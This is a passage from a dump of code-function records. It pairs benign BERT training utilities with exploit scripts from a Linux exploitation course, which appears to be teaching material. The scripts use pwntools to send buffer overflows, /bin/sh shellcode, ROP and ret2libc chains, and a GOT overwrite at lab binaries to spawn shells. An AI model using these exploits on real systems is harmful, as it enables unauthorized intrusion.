l[0] == 'beta':\n            pointer = getattr(pointer, 'bias')\n        elif l[0] == 'output_weights':\n            pointer = getattr(pointer, 'weight')\n        elif l[0] == 'squad':\n            pointer = getattr(pointer, 'classifier')\n        else:\n            try:\n                pointer = getattr(pointer, l[0])\n            except AttributeError:\n                logger.info(\"Skipping {}\".format(\"/\".join(name)))\n                continue\n        if len(l) >= 2:\n            num = int(l[1])\n            pointer = pointer[num]\n    if m_name[-11:] == '_embeddings':\n        pointer = getattr(pointer, 'weight')\n    elif m_name == 'kernel':\n        array = np.transpose(array)\n    try:\n        assert pointer.shape == array.shape\n    except AssertionError as e:\n        e.args += (pointer.shape, array.shape)\n        raise\n    logger.info(\"Initialize PyTorch weight {}\".format(name))\n    pointer.data = torch.from_numpy(array)\nreturn model", "path": "baselines\\models_pytorch\\classifier_pytorch\\transformers\\modeling_bert.py", "repo_name": "CLUEbenchmark/CLUEPretrainedModels", "stars": 746, "license": "None", "language": "python", "size": 808}
{"docstring": "'''\n\u5c06json list\u5199\u5165text\u6587\u4ef6\u4e2d\n:param file_path:\n:param data:\n:return:\n'''\n", "func_signal": "def json_to_text(file_path,data):\n", "code": "if not isinstance(file_path, Path):\n    file_path = Path(file_path)\nwith open(str(file_path), 'w') as fw:\n    for line in data:\n        line = json.dumps(line, ensure_ascii=False)\n        fw.write(line + '\\n')", "path": "baselines\\models_pytorch\\classifier_pytorch\\tools\\common.py", "repo_name": "CLUEbenchmark/CLUEPretrainedModels", "stars": 746, "license": "None", "language": "python", "size": 808}
{"docstring": "\"\"\"Safe division, return 0 if denominator is 0\"\"\"\n", "func_signal": "def safe_div(numerator, denominator):\n", "code": "numerator, denominator = tf.to_float(numerator), tf.to_float(denominator)\nzeros = tf.zeros_like(numerator, dtype=numerator.dtype)\ndenominator_is_zero = tf.equal(denominator, zeros)\nreturn tf.where(denominator_is_zero, zeros, numerator / denominator)", "path": "baselines\\models\\roberta_wwm_large_ext\\tf_metrics.py", "repo_name": "CLUEbenchmark/CLUEPretrainedModels", "stars": 746, "license": "None", "language": "python", "size": 808}
{"docstring": "'''\n\u52a0\u8f7d\u6a21\u578b\n:param model:\n:param model_name:\n:param model_path:\n:param only_param:\n:return:\n'''\n", "func_signal": "def load_model(model, model_path):\n", "code": "if isinstance(model_path, Path):\n    model_path = str(model_path)\nlogging.info(f\"loading model from {str(model_path)} .\")\nstates = torch.load(model_path)\nstate = states['state_dict']\nif isinstance(model, nn.DataParallel):\n    model.module.load_state_dict(state)\nelse:\n    model.load_state_dict(state)\nreturn model", "path": "baselines\\models_pytorch\\classifier_pytorch\\tools\\common.py", "repo_name": "CLUEbenchmark/CLUEPretrainedModels", "stars": 746, "license": "None", "language": "python", "size": 808}
{"docstring": "\"\"\" Prunes heads of the model.\n    heads_to_prune: dict of {layer_num: list of heads to prune in this layer}\n    See base class PreTrainedModel\n\"\"\"\n", "func_signal": "def _prune_heads(self, heads_to_prune):\n", "code": "for layer, heads in heads_to_prune.items():\n    self.encoder.layer[layer].attention.prune_heads(heads)", "path": "baselines\\models_pytorch\\classifier_pytorch\\transformers\\modeling_bert.py", "repo_name": "CLUEbenchmark/CLUEPretrainedModels", "stars": 746, "license": "None", "language": "python", "size": 808}
{"docstring": "\"\"\"\nsetup GPU device if available, move model into configured device\n# \u5982\u679cn_gpu_use\u4e3a\u6570\u5b57\uff0c\u5219\u4f7f\u7528range\u751f\u6210list\n# \u5982\u679c\u8f93\u5165\u7684\u662f\u4e00\u4e2alist\uff0c\u5219\u9ed8\u8ba4\u4f7f\u7528list[0]\u4f5c\u4e3acontroller\n \"\"\"\n", "func_signal": "def prepare_device(n_gpu_use):\n", "code": "if not n_gpu_use:\n    device_type = 'cpu'\nelse:\n    n_gpu_use = n_gpu_use.split(\",\")\n    device_type = f\"cuda:{n_gpu_use[0]}\"\nn_gpu = torch.cuda.device_count()\nif len(n_gpu_use) > 0 and n_gpu == 0:\n    logger.warning(\"Warning: There\\'s no GPU available on this machine, training will be performed on CPU.\")\n    device_type = 'cpu'\nif len(n_gpu_use) > n_gpu:\n    msg = f\"Warning: The number of GPU\\'s configured to use is {n_gpu_use}, but only {n_gpu} are available on this machine.\"\n    logger.warning(msg)\n    n_gpu_use = range(n_gpu)\ndevice = torch.device(device_type)\nlist_ids = n_gpu_use\nreturn device, list_ids", "path": "baselines\\models_pytorch\\classifier_pytorch\\tools\\common.py", "repo_name": "CLUEbenchmark/CLUEPretrainedModels", "stars": 746, "license": "None", "language": "python", "size": 808}
{"docstring": "\"\"\" Make sure we are sharing the input and output embeddings.\n    Export to TorchScript can't handle parameter sharing so we are cloning them instead.\n\"\"\"\n", "func_signal": "def tie_weights(self):\n", "code": "self._tie_or_clone_weights(self.cls.predictions.decoder,\n                           self.bert.embeddings.word_embeddings)", "path": "baselines\\models_pytorch\\classifier_pytorch\\transformers\\modeling_bert.py", "repo_name": "CLUEbenchmark/CLUEPretrainedModels", "stars": 746, "license": "None", "language": "python", "size": 808}
{"docstring": "\"\"\" Initialize the weights \"\"\"\n", "func_signal": "def _init_weights(self, module):\n", "code": "if isinstance(module, (nn.Linear, nn.Embedding)):\n    # Slightly different from the TF version which uses truncated_normal for initialization\n    # cf https://github.com/pytorch/pytorch/pull/5617\n    module.weight.data.normal_(mean=0.0, std=self.config.initializer_range)\nelif isinstance(module, BertLayerNorm):\n    module.bias.data.zero_()\n    module.weight.data.fill_(1.0)\nif isinstance(module, nn.Linear) and module.bias is not None:\n    module.bias.data.zero_()", "path": "baselines\\models_pytorch\\classifier_pytorch\\transformers\\modeling_bert.py", "repo_name": "CLUEbenchmark/CLUEPretrainedModels", "stars": 746, "license": "None", "language": "python", "size": 808}
{"docstring": "\"\"\" Make sure we are sharing the input and output embeddings.\n    Export to TorchScript can't handle parameter sharing so we are cloning them instead.\n\"\"\"\n", "func_signal": "def tie_weights(self):\n", "code": "self._tie_or_clone_weights(self.cls.predictions.decoder,\n                           self.bert.embeddings.word_embeddings)", "path": "baselines\\models_pytorch\\classifier_pytorch\\transformers\\modeling_bert.py", "repo_name": "CLUEbenchmark/CLUEPretrainedModels", "stars": 746, "license": "None", "language": "python", "size": 808}
{"docstring": "'''\n\u52a0\u8f7djson\u6587\u4ef6\n:param json_path:\n:param file_name:\n:return:\n'''\n", "func_signal": "def load_json(file_path):\n", "code": "if not isinstance(file_path, Path):\n    file_path = Path(file_path)\nwith open(str(file_path), 'r') as f:\n    data = json.load(f)\nreturn data", "path": "baselines\\models_pytorch\\classifier_pytorch\\tools\\common.py", "repo_name": "CLUEbenchmark/CLUEPretrainedModels", "stars": 746, "license": "None", "language": "python", "size": 808}
{"docstring": "\"\"\"Uses a confusion matrix to compute precision, recall and fbeta\"\"\"\n", "func_signal": "def pr_re_fbeta(cm, pos_indices, beta=1):\n", "code": "num_classes = cm.shape[0]\nneg_indices = [i for i in range(num_classes) if i not in pos_indices]\ncm_mask = np.ones([num_classes, num_classes])\ncm_mask[neg_indices, neg_indices] = 0\ndiag_sum = tf.reduce_sum(tf.diag_part(cm * cm_mask))\n\ncm_mask = np.ones([num_classes, num_classes])\ncm_mask[:, neg_indices] = 0\ntot_pred = tf.reduce_sum(cm * cm_mask)\n\ncm_mask = np.ones([num_classes, num_classes])\ncm_mask[neg_indices, :] = 0\ntot_gold = tf.reduce_sum(cm * cm_mask)\n\npr = safe_div(diag_sum, tot_pred)\nre = safe_div(diag_sum, tot_gold)\nfbeta = safe_div((1. + beta**2) * pr * re, beta**2 * pr + re)\n\nreturn pr, re, fbeta", "path": "baselines\\models\\roberta_wwm_large_ext\\tf_metrics.py", "repo_name": "CLUEbenchmark/CLUEPretrainedModels", "stars": 746, "license": "None", "language": "python", "size": 808}
{"docstring": "'''\n\u8bbe\u7f6e\u6574\u4e2a\u5f00\u53d1\u73af\u5883\u7684seed\n:param seed:\n:param device:\n:return:\n'''\n", "func_signal": "def seed_everything(seed=1029):\n", "code": "random.seed(seed)\nos.environ['PYTHONHASHSEED'] = str(seed)\nnp.random.seed(seed)\ntorch.manual_seed(seed)\ntorch.cuda.manual_seed(seed)\ntorch.cuda.manual_seed_all(seed)\n# some cudnn methods can be random even after fixing the seed\n# unless you tell it to be deterministic\ntorch.backends.cudnn.deterministic = True", "path": "baselines\\models_pytorch\\classifier_pytorch\\tools\\common.py", "repo_name": "CLUEbenchmark/CLUEPretrainedModels", "stars": 746, "license": "None", "language": "python", "size": 808}
{"docstring": "\"\"\"Performs a single optimization step.\nArguments:\n    closure (callable, optional): A closure that reevaluates the model\n        and returns the loss.\n\"\"\"\n", "func_signal": "def step(self, closure=None):\n", "code": "loss = None\nif closure is not None:\n    loss = closure()\n\nfor group in self.param_groups:\n    for p in group['params']:\n        if p.grad is None:\n            continue\n        grad = p.grad.data\n        if grad.is_sparse:\n            raise RuntimeError('Adam does not support sparse gradients, please consider SparseAdam instead')\n\n        state = self.state[p]\n\n        # State initialization\n        if len(state) == 0:\n            state['step'] = 0\n            # Exponential moving average of gradient values\n            state['next_m'] = torch.zeros_like(p.data)\n            # Exponential moving average of squared gradient values\n            state['next_v'] = torch.zeros_like(p.data)\n\n        next_m, next_v = state['next_m'], state['next_v']\n        beta1, beta2 = group['b1'], group['b2']\n\n        # Add grad clipping\n        if group['max_grad_norm'] > 0:\n            clip_grad_norm_(p, group['max_grad_norm'])\n\n        # Decay the first and second moment running average coefficient\n        # In-place operations to update the averages at the same time\n        next_m.mul_(beta1).add_(1 - beta1, grad)\n        next_v.mul_(beta2).addcmul_(1 - beta2, grad, grad)\n        update = next_m / (next_v.sqrt() + group['e'])\n\n        # Just adding the square of the weights to the loss function is *not*\n        # the correct way of using L2 regularization/weight decay with Adam,\n        # since that will interact with the m and v parameters in strange ways.\n        #\n        # Instead we want ot decay the weights in a manner that doesn't interact\n        # with the m/v parameters. This is equivalent to adding the square\n        # of the weights to the loss with plain (non-momentum) SGD.\n        if group['weight_decay_rate'] > 0.0:\n            update += group['weight_decay_rate'] * p.data\n\n        schedule_fct = SCHEDULES[group['schedule']]\n        if group['cycle_step'] is not None and state['step'] > group['cycle_step']:\n            lr_scheduled = group['lr'] * (1 - ((state['step'] % group['cycle_step']) / group['cycle_step']))\n        elif group['t_total'] != -1 and group['schedule'] != 'warmup_fix':\n            lr_scheduled = group['lr'] * schedule_fct(state['step'] / group['t_total'], group['warmup'])\n        elif group['schedule'] == 'warmup_fix':\n            lr_scheduled = group['lr'] * schedule_fct(state['step'], group['warmup'] * group['t_total'])\n        else:\n            lr_scheduled = group['lr']\n\n        update_with_lr = lr_scheduled * update\n        p.data.add_(-update_with_lr)\n\n        state['step'] += 1\n\nreturn loss", "path": "baselines\\models_pytorch\\mrc_pytorch\\tools\\pytorch_optimization.py", "repo_name": "CLUEbenchmark/CLUEPretrainedModels", "stars": 746, "license": "None", "language": "python", "size": 808}
{"docstring": "'''\n\u4fdd\u5b58\u6210pickle\u6587\u4ef6\n:param data:\n:param file_name:\n:param pickle_path:\n:return:\n'''\n", "func_signal": "def save_pickle(data, file_path):\n", "code": "if isinstance(file_path, Path):\n    file_path = str(file_path)\nwith open(file_path, 'wb') as f:\n    pickle.dump(data, f)", "path": "baselines\\models_pytorch\\classifier_pytorch\\tools\\common.py", "repo_name": "CLUEbenchmark/CLUEPretrainedModels", "stars": 746, "license": "None", "language": "python", "size": 808}
{"docstring": "'''\n\u6253\u5370\u6a21\u578b\u7ed3\u6784\u4fe1\u606f\n:param model:\n:param inputs:\n:param batch_size:\n:param show_input:\n:return:\nExample:\n    >>> print(\"model summary info: \")\n    >>> for step,batch in enumerate(train_data):\n    >>>     summary(self.model,*batch,show_input=True)\n    >>>     break\n'''\n\n", "func_signal": "def summary(model, *inputs, batch_size=-1, show_input=True):\n", "code": "def register_hook(module):\n    def hook(module, input, output=None):\n        class_name = str(module.__class__).split(\".\")[-1].split(\"'\")[0]\n        module_idx = len(summary)\n\n        m_key = f\"{class_name}-{module_idx + 1}\"\n        summary[m_key] = OrderedDict()\n        summary[m_key][\"input_shape\"] = list(input[0].size())\n        summary[m_key][\"input_shape\"][0] = batch_size\n\n        if show_input is False and output is not None:\n            if isinstance(output, (list, tuple)):\n                for out in output:\n                    if isinstance(out, torch.Tensor):\n                        summary[m_key][\"output_shape\"] = [\n                            [-1] + list(out.size())[1:]\n                        ][0]\n                    else:\n                        summary[m_key][\"output_shape\"] = [\n                            [-1] + list(out[0].size())[1:]\n                        ][0]\n            else:\n                summary[m_key][\"output_shape\"] = list(output.size())\n                summary[m_key][\"output_shape\"][0] = batch_size\n\n        params = 0\n        if hasattr(module, \"weight\") and hasattr(module.weight, \"size\"):\n            params += torch.prod(torch.LongTensor(list(module.weight.size())))\n            summary[m_key][\"trainable\"] = module.weight.requires_grad\n        if hasattr(module, \"bias\") and hasattr(module.bias, \"size\"):\n            params += torch.prod(torch.LongTensor(list(module.bias.size())))\n        summary[m_key][\"nb_params\"] = params\n\n    if (not isinstance(module, nn.Sequential) and not isinstance(module, nn.ModuleList) and not (module == model)):\n        if show_input is True:\n            hooks.append(module.register_forward_pre_hook(hook))\n        else:\n            hooks.append(module.register_forward_hook(hook))\n\n# create properties\nsummary = OrderedDict()\nhooks = []\n\n# register hook\nmodel.apply(register_hook)\nmodel(*inputs)\n\n# remove these hooks\nfor h in hooks:\n    h.remove()\n\nprint(\"-----------------------------------------------------------------------\")\nif show_input is True:\n    line_new = f\"{'Layer (type)':>25}  {'Input Shape':>25} {'Param #':>15}\"\nelse:\n    line_new = f\"{'Layer (type)':>25}  {'Output Shape':>25} {'Param #':>15}\"\nprint(line_new)\nprint(\"=======================================================================\")\n\ntotal_params = 0\ntotal_output = 0\ntrainable_params = 0\nfor layer in summary:\n    # input_shape, output_shape, trainable, nb_params\n    if show_input is True:\n        line_new = \"{:>25}  {:>25} {:>15}\".format(\n            layer,\n            str(summary[layer][\"input_shape\"]),\n            \"{0:,}\".format(summary[layer][\"nb_params\"]),\n        )\n    else:\n        line_new = \"{:>25}  {:>25} {:>15}\".format(\n            layer,\n            str(summary[layer][\"output_shape\"]),\n            \"{0:,}\".format(summary[layer][\"nb_params\"]),\n        )\n\n    total_params += summary[layer][\"nb_params\"]\n    if show_input is True:\n        total_output += np.prod(summary[layer][\"input_shape\"])\n    else:\n        total_output += np.prod(summary[layer][\"output_shape\"])\n    if \"trainable\" in summary[layer]:\n        if summary[layer][\"trainable\"] == True:\n            trainable_params += summary[layer][\"nb_params\"]\n\n    print(line_new)\n\nprint(\"=======================================================================\")\nprint(f\"Total params: {total_params:0,}\")\nprint(f\"Trainable params: {trainable_params:0,}\")\nprint(f\"Non-trainable params: {(total_params - trainable_params):0,}\")\nprint(\"-----------------------------------------------------------------------\")", "path": "baselines\\models_pytorch\\classifier_pytorch\\tools\\common.py", "repo_name": "CLUEbenchmark/CLUEPretrainedModels", "stars": 746, "license": "None", "language": "python", "size": 808}
{"docstring": "'''\n\u4fdd\u5b58\u6210.npy\u6587\u4ef6\n:param data:\n:param file_path:\n:return:\n'''\n", "func_signal": "def save_numpy(data, file_path):\n", "code": "if not isinstance(file_path, Path):\n    file_path = Path(file_path)\nnp.save(str(file_path),data)", "path": "baselines\\models_pytorch\\classifier_pytorch\\tools\\common.py", "repo_name": "CLUEbenchmark/CLUEPretrainedModels", "stars": 746, "license": "None", "language": "python", "size": 808}
{"docstring": "'''\nExample:\n    >>> init_logger(log_file)\n    >>> logger.info(\"abc'\")\n'''\n", "func_signal": "def init_logger(log_file=None, log_file_level=logging.NOTSET):\n", "code": "if isinstance(log_file,Path):\n    log_file = str(log_file)\nlog_format = logging.Formatter(fmt='%(asctime)s - %(levelname)s - %(name)s -   %(message)s',\n                               datefmt='%m/%d/%Y %H:%M:%S')\n\nlogger = logging.getLogger()\nlogger.setLevel(logging.INFO)\nconsole_handler = logging.StreamHandler()\nconsole_handler.setFormatter(log_format)\nlogger.handlers = [console_handler]\nif log_file and log_file != '':\n    file_handler = logging.FileHandler(log_file)\n    file_handler.setLevel(log_file_level)\n    # file_handler.setFormatter(log_format)\n    logger.addHandler(file_handler)\nreturn logger", "path": "baselines\\models_pytorch\\classifier_pytorch\\tools\\common.py", "repo_name": "CLUEbenchmark/CLUEPretrainedModels", "stars": 746, "license": "None", "language": "python", "size": 808}
{"docstring": "'''\n\u52a0\u8f7d\u6a21\u578b\n:param resume_path:\n:param model:\n:param optimizer:\n:return:\n\u6ce8\u610f\uff1a \u5982\u679c\u662f\u52a0\u8f7dBert\u6a21\u578b\u7684\u8bdd\uff0c\u9700\u8981\u8c03\u6574\uff0c\u4e0d\u80fd\u4f7f\u7528\u8be5\u6a21\u5f0f\n\u53ef\u4ee5\u4f7f\u7528\u6a21\u5757\u81ea\u5e26\u7684Bert_model.from_pretrained(state_dict = your save state_dict)\n'''\n", "func_signal": "def restore_checkpoint(resume_path, model=None):\n", "code": "if isinstance(resume_path, Path):\n    resume_path = str(resume_path)\ncheckpoint = torch.load(resume_path)\nbest = checkpoint['best']\nstart_epoch = checkpoint['epoch'] + 1\nstates = checkpoint['state_dict']\nif isinstance(model, nn.DataParallel):\n    model.module.load_state_dict(states)\nelse:\n    model.load_state_dict(states)\nreturn [model,best,start_epoch]", "path": "baselines\\models_pytorch\\classifier_pytorch\\tools\\common.py", "repo_name": "CLUEbenchmark/CLUEPretrainedModels", "stars": 746, "license": "None", "language": "python", "size": 808}
{"docstring": "# Start the process\n", "func_signal": "def main():\n", "code": "p = process(\"../build/1_staticnx\")\n\n# Craft the payload\npayload = \"A\"*148 + rop\npayload = payload.ljust(1000, \"\\x00\")\n\n# Send the payload\np.send(payload)\n\n# Transfer interaction to the user\np.interactive()", "path": "lessons\\6_bypass_nx_rop\\scripts\\3_brokenrop.py", "repo_name": "nnamon/linux-exploitation-course", "stars": 908, "license": "cc-by-4.0", "language": "python", "size": 2492}
{"docstring": "# Start a local process\n", "func_signal": "def main():\n", "code": "p = process(\"../build/2_interactive\")\n\n# Get rid of the prompt\ndata1 = p.recvrepeat(0.2)\nlog.info(\"Got data: %s\" % data1)\n\n# Send the password\np.sendline(\"TheRealPassword\")\n\n# Check for success or failure\ndata2 = p.recvline()\nlog.info(\"Got data: %s\" % data2)\nif \"Correct\" in data2:\n    # Hand interaction over to the user if successful\n    log.success(\"Success! Enjoy your shell!\")\n    p.interactive()\nelse:\n    log.failure(\"Password was incorrect.\")", "path": "lessons\\3_intro_to_tools\\scripts\\3_interactive.py", "repo_name": "nnamon/linux-exploitation-course", "stars": 908, "license": "cc-by-4.0", "language": "python", "size": 2492}
{"docstring": "# Start a local process\n#p = process(\"../build/2_interactive\")\n", "func_signal": "def main():\n", "code": "p = remote(\"localhost\", 1330)\n\n# Get rid of the prompt\ndata1 = p.recvrepeat(0.2)\nlog.info(\"Got data: %s\" % data1)\n\n# Send the password\np.sendline(\"TheRealPassword\")\n\n# Check for success or failure\ndata2 = p.recvline()\nlog.info(\"Got data: %s\" % data2)\nif \"Correct\" in data2:\n    # Hand interaction over to the user if successful\n    log.success(\"Success! Enjoy your shell!\")\n    p.interactive()\nelse:\n    log.failure(\"Password was incorrect.\")", "path": "lessons\\3_intro_to_tools\\scripts\\4_networked.py", "repo_name": "nnamon/linux-exploitation-course", "stars": 908, "license": "cc-by-4.0", "language": "python", "size": 2492}
{"docstring": "#p = process(\"./blackbeauty\")\n", "func_signal": "def main():\n", "code": "p = remote(\"localhost\", 1350)\n\n# Random tape length\np.sendline(\"10\")\n\n# Write the address of the src file to the symbol member struct\nsrc_file_address = p64(0x6020a0)\np.sendline(\"3\")\np.sendline(\"-8\")\nfor i in src_file_address:\n    p.sendline(\"2\")\n    p.sendline(str(ord(i)))\n\n# Write new shell command\np.sendline(\"4\")\np.send(\"/bin/sh\".ljust(16, \"\\x00\"))\n\n# Spawn the shell\np.sendline(\"8\")\n\np.recvrepeat(0.2)\n\nlog.success(\"Enjoy your shell!\")\np.interactive()", "path": "lessons\\14_advanced_exercises\\challenges\\black_beauty\\exploit.py", "repo_name": "nnamon/linux-exploitation-course", "stars": 908, "license": "cc-by-4.0", "language": "python", "size": 2492}
{"docstring": "# Start the process\n", "func_signal": "def main():\n", "code": "p = process(\"../build/3_vulnerable\")\n\n# Craft the payload\npayload = \"A\"*76\npayload += p32(system_address)\npayload += p32(0xdeadbeef)\npayload += p32(binsh_offset)\npayload = payload.ljust(96, \"\\x00\")\n\n# Send the payload\np.send(payload)\n\n# Pass interaction to the user\np.interactive()", "path": "lessons\\7_bypass_nx_ret2libc\\scripts\\2_final.py", "repo_name": "nnamon/linux-exploitation-course", "stars": 908, "license": "cc-by-4.0", "language": "python", "size": 2492}
{"docstring": "# Start a new process\n", "func_signal": "def main():\n", "code": "p = process(\"../build/3_reversing\")\n\n# Name and Token\nname = \"Santo & Johnny\".ljust(63, \"\\x00\")\ntoken = 0xdeadc0de\n\n# Send name and token\np.send(name)\np.send(p32(token))\n\n# Start an interactive session\np.interactive()", "path": "lessons\\3_intro_to_tools\\scripts\\6_gdbsol.py", "repo_name": "nnamon/linux-exploitation-course", "stars": 908, "license": "cc-by-4.0", "language": "python", "size": 2492}
{"docstring": "# Start a new process\n", "func_signal": "def main():\n", "code": "p = remote(\"localhost\", 1900)\n\n# Name and Token\nname = \"Santo & Johnny\".ljust(63, \"\\x00\")\ntoken = 0xdeadc0de\n\n# Send name and token\np.send(name)\np.send(p32(token))\n\n# Start an interactive session\np.interactive()", "path": "lessons\\3_intro_to_tools\\scripts\\7_gdbremote.py", "repo_name": "nnamon/linux-exploitation-course", "stars": 908, "license": "cc-by-4.0", "language": "python", "size": 2492}
{"docstring": "# Start the process\n#p = process(\"../build/2_event0\")\n", "func_signal": "def main():\n", "code": "p = remote(\"localhost\", 1901)\n\n# Craft the payload\npayload = \"A\"*112\npayload += p32(puts_plt)\npayload += p32(0xdeadbeef)\npayload += p32(secret_address)\npayload = payload.ljust(200, \"\\x00\")\n\n# Send the payload\np.send(payload)\n\n# Pass interaction to the user\np.interactive()", "path": "lessons\\9_bypass_ret2plt\\scripts\\5_event0_remote.py", "repo_name": "nnamon/linux-exploitation-course", "stars": 908, "license": "cc-by-4.0", "language": "python", "size": 2492}
{"docstring": "# Start the process\n", "func_signal": "def main():\n", "code": "p = process(\"../build/2_event0\")\n\n# Craft the payload\npayload = \"A\"*112\npayload += p32(puts_plt)\npayload += p32(0xdeadbeef)\npayload += p32(secret_address)\npayload = payload.ljust(200, \"\\x00\")\n\n# Send the payload\np.send(payload)\n\n# Pass interaction to the user\np.interactive()", "path": "lessons\\9_bypass_ret2plt\\scripts\\4_event0_local.py", "repo_name": "nnamon/linux-exploitation-course", "stars": 908, "license": "cc-by-4.0", "language": "python", "size": 2492}
{"docstring": "# Start the process\n", "func_signal": "def main():\n", "code": "p = process(\"../build/1_staticnx\")\n\n# Craft the payload\npayload = \"A\"*148 + rop\npayload = payload.ljust(1000, \"\\x00\")\n\n# Send the payload\np.send(payload)\n\n# Transfer interaction to the user\np.interactive()", "path": "lessons\\6_bypass_nx_rop\\scripts\\2_ropexploit.py", "repo_name": "nnamon/linux-exploitation-course", "stars": 908, "license": "cc-by-4.0", "language": "python", "size": 2492}
{"docstring": "# Start the process\n", "func_signal": "def main():\n", "code": "p = process(\"../build/3_vulnerable\")\n\n# Print the pid\nraw_input(str(p.proc.pid))\n\n# Craft the payload\npayload = \"A\"*76 + p32(0xdeadc0de)\npayload = payload.ljust(96, \"\\x00\")\n\n# Send the payload\np.send(payload)\n\n# Pass interaction to the user\np.interactive()", "path": "lessons\\7_bypass_nx_ret2libc\\scripts\\1_skeleton.py", "repo_name": "nnamon/linux-exploitation-course", "stars": 908, "license": "cc-by-4.0", "language": "python", "size": 2492}
{"docstring": "# Start the process\n", "func_signal": "def main():\n", "code": "p = process(\"../build/1_clock\")\n\n# Craft the payload\npayload = \"A\"*76\npayload += p32(system_plt)\npayload += p32(0xdeadbeef)\npayload += p32(ed_str)\npayload = payload.ljust(96, \"\\x00\")\n\n# Send the payload\np.send(payload)\n\n# Pass interaction to the user\np.interactive()", "path": "lessons\\9_bypass_ret2plt\\scripts\\2_final.py", "repo_name": "nnamon/linux-exploitation-course", "stars": 908, "license": "cc-by-4.0", "language": "python", "size": 2492}
{"docstring": "#p = process(\"../build/2_event1\")\n", "func_signal": "def main():\n", "code": "p = remote(\"localhost\", 1902)\n\n# Read until name prompt\np.recvrepeat(0.2)\n\n# Send the binsh\np.sendline(\"/bin/sh\")\np.recvrepeat(0.2)\n\n# Select option 1\np.sendline(\"1\")\np.sendline(hex(puts_got))\n\n# Get leak\ndata = p.recvrepeat(0.2)\nputs_addr = 0\nfor i in data.split(\"\\n\"):\n    if \"Contents:\" in i:\n        puts_addr = int(i[i.find(\"Contents:\")+10:], 16)\nlog.info(\"puts_addr = 0x%x\" % puts_addr)\n\n# Calculate\nlibc_base = puts_addr - offset_puts\nsystem_addr = libc_base + offset_system\n\n#pwn\np.sendline(\"3\")\np.sendline(hex(puts_got))\np.sendline(hex(system_addr))\np.recvrepeat(0.2)\n\np.interactive()", "path": "lessons\\10_bypass_got\\scripts\\6_exercise_sol.py", "repo_name": "nnamon/linux-exploitation-course", "stars": 908, "license": "cc-by-4.0", "language": "python", "size": 2492}
{"docstring": "# Start a process\n", "func_signal": "def main():\n", "code": "p = process(\"../build/1_vulnerable\")\n\n# Create payload\nret_address = 0xffffd5f0 + 28 + 4\npayload = \"A\"*28 + p32(ret_address)\npayload = payload.ljust(100, \"\\xcc\")\n\n# Print the process id\nraw_input(str(p.proc.pid))\n\n# Send the payload to the binary\np.send(payload)\n\n# Pass interaction back to the user\np.interactive()", "path": "lessons\\4_classic_exploitation\\scripts\\2_stackjump.py", "repo_name": "nnamon/linux-exploitation-course", "stars": 908, "license": "cc-by-4.0", "language": "python", "size": 2492}
{"docstring": "# Start a process\n", "func_signal": "def main():\n", "code": "p = process(\"../build/1_vulnerable\")\n\n# Create payload\nret_address = 0xffffd620 + 28 + 4\nshellcode = (\"\\xeb\\x1f\\x5e\\x89\\x76\\x08\\x31\\xc0\\x88\\x46\\x07\\x89\\x46\\x0c\\xb0\\x0b\" +\n             \"\\x89\\xf3\\x8d\\x4e\\x08\\x8d\\x56\\x0c\\xcd\\x80\\x31\\xdb\\x89\\xd8\\x40\\xcd\" +\n             \"\\x80\\xe8\\xdc\\xff\\xff\\xff/bin/sh\")\npayload = \"A\"*28 + p32(ret_address)\npadding_len = 100 - len(payload) - len(shellcode)\npayload += \"\\x90\" * padding_len + shellcode\n\n# Send the payload to the binary\np.send(payload)\n\n# Pass interaction back to the user\np.interactive()", "path": "lessons\\4_classic_exploitation\\scripts\\3_final.py", "repo_name": "nnamon/linux-exploitation-course", "stars": 908, "license": "cc-by-4.0", "language": "python", "size": 2492}
{"docstring": "# Start the process\n", "func_signal": "def main():\n", "code": "p = process(\"../build/1_clock\")\n\n# Print the pid\nraw_input(str(p.proc.pid))\n\n# Craft the payload\npayload = \"A\"*76 + p32(0xdeadc0de)\npayload = payload.ljust(96, \"\\x00\")\n\n# Send the payload\np.send(payload)\n\n# Pass interaction to the user\np.interactive()", "path": "lessons\\9_bypass_ret2plt\\scripts\\1_skeleton.py", "repo_name": "nnamon/linux-exploitation-course", "stars": 908, "license": "cc-by-4.0", "language": "python", "size": 2492}
{"docstring": "# Start the process\n", "func_signal": "def main():\n", "code": "p = process(\"../build/1_staticnx\")\n\n# Craft the payload\npayload = \"A\"*148 + p32(0xdeadc0de)\npayload = payload.ljust(1000, \"\\x00\")\n\n# Print the process id\nraw_input(str(p.proc.pid))\n\n# Send the payload\np.send(payload)\n\n# Transfer interaction to the user\np.interactive()", "path": "lessons\\6_bypass_nx_rop\\scripts\\1_skeleton.py", "repo_name": "nnamon/linux-exploitation-course", "stars": 908, "license": "cc-by-4.0", "language": "python", "size": 2492}
{"docstring": "# Start the process\n", "func_signal": "def main():\n", "code": "p = process(\"../build/2_event0\")\n\n# Print the pid\nraw_input(str(p.proc.pid))\n\n# Craft the payload\npayload = \"A\"*112 + p32(0xdeadc0de)\npayload = payload.ljust(200, \"\\x00\")\n\n# Send the payload\np.send(payload)\n\n# Pass interaction to the user\np.interactive()", "path": "lessons\\9_bypass_ret2plt\\scripts\\3_event0_skeleton.py", "repo_name": "nnamon/linux-exploitation-course", "stars": 908, "license": "cc-by-4.0", "language": "python", "size": 2492}
{"docstring": "#p = process(\"./dragrace\")\n", "func_signal": "def main():\n", "code": "p = remote(\"localhost\", 1345)\nleak_line = p.recvline().strip()\nbuffer_address = int(leak_line[22:], 16)\nlog.info(\"Buffer Address: 0x%x\" % buffer_address)\n\npayload = \"Ru'Pauls\" + shellcode\npayload = payload.ljust(136, \"\\x90\")\npayload += p64(buffer_address + 8)\n\np.sendline(payload)\n\np.recvrepeat(0.2)\nlog.success(\"Enjoy your shell\")\np.interactive()", "path": "lessons\\14_advanced_exercises\\challenges\\dragrace\\exploit.py", "repo_name": "nnamon/linux-exploitation-course", "stars": 908, "license": "cc-by-4.0", "language": "python", "size": 2492}
{"docstring": "# Start a process\n", "func_signal": "def main():\n", "code": "p = process(\"../build/1_vulnerable\")\n\n# Create payload\nret_address = 0x41424344\npayload = \"A\"*28 + p32(ret_address)\npayload = payload.ljust(100, \"\\x00\")\n\n# Print the process id\nraw_input(str(p.proc.pid))\n\n# Send the payload to the binary\np.send(payload)\n\n# Pass interaction back to the user\np.interactive()", "path": "lessons\\4_classic_exploitation\\scripts\\1_skeleton.py", "repo_name": "nnamon/linux-exploitation-course", "stars": 908, "license": "cc-by-4.0", "language": "python", "size": 2492}
